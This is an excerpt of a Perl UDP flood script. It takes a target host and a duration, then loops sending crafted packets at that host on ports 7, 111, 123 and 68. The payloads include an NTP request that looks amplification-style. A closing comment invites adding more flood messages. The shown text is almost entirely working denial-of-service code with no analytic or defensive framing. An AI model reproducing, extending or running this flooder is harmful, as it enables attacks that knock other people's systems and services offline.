...
Usage: perl script.pl <host> <time>\n";
}
...
for (; time() <= $endtime;) {
    send("flood", "\x0D\x0A" x 50, 0, pack_sockaddr_in(7, $iaddr));
    ...
    send("flood", "\x00\x6F" x 60, 0, pack_sockaddr_in(111, $iaddr));
    send("flood", "\xfd\x00\x0a\xfb" . "\x00\x00\x00\x00\x00\x01" . "\x72\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\x02\x24\xec\xec\x42\xee\x92", 0, pack_sockaddr_in(123, $iaddr));
    ...
    send("flood", "", 0, pack_sockaddr_in("68", $iaddr));
    send("flood", "\x00\x00\x00\x00\x00\x00\x00\x38\x89\x78\x71\x84\xdd\x94\x90\x8f", 0, pack_sockaddr_in("68", $iaddr));
    # Add more flood messages targeting different ports using unique hexadecimal strings
